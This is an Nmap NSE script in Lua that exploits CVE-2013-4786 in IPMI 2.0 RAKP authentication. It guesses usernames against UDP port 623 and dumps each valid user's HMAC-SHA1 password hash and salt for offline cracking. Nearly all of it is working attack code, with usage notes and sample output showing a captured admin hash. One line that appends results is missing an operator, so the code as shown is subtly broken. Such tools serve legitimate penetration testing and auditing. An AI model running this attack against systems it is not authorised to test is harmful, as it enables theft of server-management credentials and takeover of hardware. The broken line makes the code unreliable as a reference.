local ipmi = require "ipmi"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local unpwdb = require "unpwdb"

description = [[
Dumps password hashes from IPMI RPC server, so they can be cracked by external tool such as hashcat.

If none is supplied, nselib/data/usernames.lst will be used.

The script works by exploiting vulnerability CVE-2013-4786, where in standard communication, attacker can obtain, for every known user, hash containing password, which can be later used for offline cracking. Furthermore, if tried username is not valid, it can be recognised from the communication.
]]

---
-- @usage
-- nmap -sU --script ipmi-dumphashes [--script-args="userdb=<database of users>"] -p 623 <target>
-- @args userdb File with usernames to be used for dumping hashes (optional)
-- @output
-- PORT     STATE  SERVICE REASON
-- 623/udp  open|filtered  unknown
-- | ipmi-dumphashes: 
-- |   found: 
-- |_    admin:545a5542[shortened]0561646d696e:2fbf32e[shortened]5974d27be040

author = "Roman Stevanak"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive"}

portrule = shortport.port_or_service(623, "asf-rmcp", "udp", {"open", "open|filtered"})

testname = function(host,port,username)
  -- setting up socket
  local socket = nmap.new_socket('udp','inet')
  socket:set_timeout(
    ((host.times and host.times.timeout) or 8) * 1000)
  socket:connect(host, port, "udp")

  -- sending RCMP open session request
  local console_session_id = stdnse.generate_random_string(4)
  local console_random_id = stdnse.generate_random_string(16)
  local request = ipmi.session_open_request(console_session_id)
  socket:send(request)

  -- receiving RCMP open session response
  local status, reply
  status, reply = socket:receive()

  if not status then
    stdnse.debug(1, "No response to RCMP open session request from"
      .. host.ip .. ":" .. port.number)
    return false
  end

  local session = ipmi.parse_open_session_reply(reply)
  if session["session_payload_type"] ~= ipmi.PAYLOADS["RMCPPLUSOPEN_REP"] then
    stdnse.debug(1, "Unknown RCMP open session response in"
      .. host.ip.. ":" .. port.number)
    return false
  elseif session["error_code"] ~= 0 then
    local errorstr = ipmi.RMCP_ERRORS[session.error_code] or "Unknown error"
    stdnse.debug(1, errorstr .. " in RCMP open session response from "
      .. host.ip .. ":" .. port.number)
    return false
  end

  -- RAKP1 message - request
  local bmc_session_id = session["bmc_session_id"]
  local rakp1_request = ipmi.rakp_1_request(
    bmc_session_id, console_random_id, username)
  socket:send(rakp1_request)

  -- RAKP2 message - response
  status, reply = socket:receive()

  if not status then
    stdnse.debug(1, "No response to RAKP1 message from"
      .. host.ip .. ":" .. port.number
      .. " - Possibly nonexistent user")
    return false
  end

  local rakp2_message = ipmi.parse_rakp_1_reply(reply)

  if rakp2_message["session_payload_type"] ~= ipmi.PAYLOADS["RAKP2"] then
    stdnse.debug(1, "Unknown RAKP2 message from"
      .. host.ip .. ":" .. port.number)
    return false
  elseif rakp2_message["error_code"] ~= 0 then
    local errorstr = ipmi.RMCP_ERRORS[rakp2_message["error_code"]]
      or "Unknown error"
    stdnse.debug(1, errorstr .. " in RAKP2" .. host.ip .. ":" .. port)
    return false
  end
 -- TODO: support HMAC-md5 and HMAC-sha256 as well
  local hmac_salt = ipmi.rakp_hmac_sha1_salt(
      console_session_id,
      session["bmc_session_id"],
      console_random_id,
      rakp2_message["bmc_random_id"],
      rakp2_message["bmc_guid"],
      0x14,
      username
    )
  return true, rakp2_message["hmac_sha1"], hmac_salt
end

action = function(host, port)
  -- setting up output
  local output = stdnse.output_table()
  output.found = {}
  
  -- loading username database
  local try = nmap.new_try()
  users = try(unpwdb.usernames())
  
  -- bruteforcing
  for username in users do
    stdnse.debug(3, "Trying"
      .. username .. ":" 
      .. host.ip .. ":"
      .. port.number)
    status, hmac, salt = testname(host, port, username)
      if status then
        output.found[#output.found 1] = username .. ":"
	  .. stdnse.tohex(salt) .. ":"
	  .. stdnse.tohex(hmac)
      end
  end
  return output
end
